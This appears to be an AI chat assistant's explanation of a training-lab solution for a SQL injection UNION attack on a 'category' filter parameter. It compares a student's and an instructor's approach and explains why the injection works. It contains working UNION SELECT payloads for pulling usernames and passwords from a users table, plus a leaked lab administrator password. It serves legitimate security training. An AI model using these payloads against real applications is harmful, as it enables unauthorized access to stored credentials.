
---

## **💡 Quick Overview**

This lab demonstrates a **SQL Injection UNION attack** on the `category` parameter to retrieve usernames and passwords from the `users` table. Both your solution and the instructor's work because the application directly integrates unsanitized user input into an SQL query, allowing attackers to manipulate it.

### **Why Both Solutions Work**:

- **Your Solution**: You manually tested the injection point by adding `'` and analyzing response lengths to identify an error. Then, using a UNION SELECT payload, you retrieved the `username` and `password` columns from the `users` table.

- **Instructor's Solution**: The instructor systematically determined the query structure using UNION SELECT payloads and automated enumeration with tools like Burp Intruder and SQLmap, leading to the same result of extracting sensitive data.

---

## **🛠️ Steps to Complete the Lab**

### **Your Solution**:

1. **Identify the Injection Point**:
    
    - Intercepted the GET request:
        
        plaintext
        
        CopyEdit
        
        `GET /filter?category=Food+%26+Drink`
        
    - Appended `'` to the `category` parameter and analyzed the response:
        - A shorter content length and `500 Internal Server Error` indicated an SQL Injection vulnerability.
2. **Test the UNION SELECT Payload**:
    
    - Injected the payload directly:
        
        plaintext
        
        CopyEdit
        
        `1' UNION SELECT username, password FROM users --`
        
    - Retrieved the following credentials in the response:
        
        plaintext
        
        CopyEdit
        
        `administrator:r08fng6gvgdcoxnsfsj5`
        
3. **Log in and Complete the Lab**:
    
    - Used the administrator credentials to log in and finish the lab.

---

### **Instructor's Solution**:

1. **Identify the Injection Point**:
    
    - Navigated the application and intercepted the GET request:
        
        plaintext
        
        CopyEdit
        
        `GET /filter?category=Pets`
        
    - Sent the request to Burp Intruder with positional markers on the `category` parameter.
2. **Determine the Query Structure**:
    
    - Tested the number of columns using:
        
        plaintext
        
        CopyEdit
        
        `'+UNION+SELECT+'abc','def'--`
        
    - Verified the response to confirm the query structure (2 columns accepting text).
3. **Retrieve Data from the `users` Table**:
    
    - Used the UNION SELECT payload:
        
        plaintext
        
        CopyEdit
        
        `'+UNION+SELECT+username,+password+FROM+users--`
        
    - Retrieved the same credentials in the response.
4. **Log in and Complete the Lab**:
    
    - Used the administrator credentials to log in and solve the lab.

---

## **❓ Why the UNION Payload Works**

The **UNION SELECT** statement combines the results of two SQL queries. It works in this lab because:

1. **Query Structure**:
    
    - The vulnerable query fetches two columns (e.g., `name` and `description`), which must match the column count and data types in the injected UNION SELECT statement.
2. **Column Matching**:
    
    - Your payload worked because the table has exactly two columns accepting text. If there were more columns, you'd need to add `NULL` placeholders to match the total number of columns.
    
    **Example**: For a table with 4 columns, the payload would be:
    
    plaintext
    
    CopyEdit
    
    `1' UNION SELECT username, password, NULL, NULL FROM users --`
    
3. **Why This Matters**:
    
    - If the column count or data types don't match, the server returns an error. Systematically testing with payloads like:
        
        plaintext
        
        CopyEdit
        
        `'+UNION+SELECT+'a','b','c'--`
        
        helps determine the correct structure.

---

## **❓ Why This is an SQL Injection Vulnerability**

1. **User-Controlled Input**:
    
    - The `category` parameter is directly embedded into the SQL query without sanitization.
2. **Query Manipulation**:
    
    - Attackers can inject UNION SELECT statements to modify the query and fetch data from unrelated tables.
3. **Impact**:
    
    - Unauthorized access to sensitive data, such as usernames and passwords, enabling privilege escalation.

---

Let me know if you'd like additional details or refinements! 😊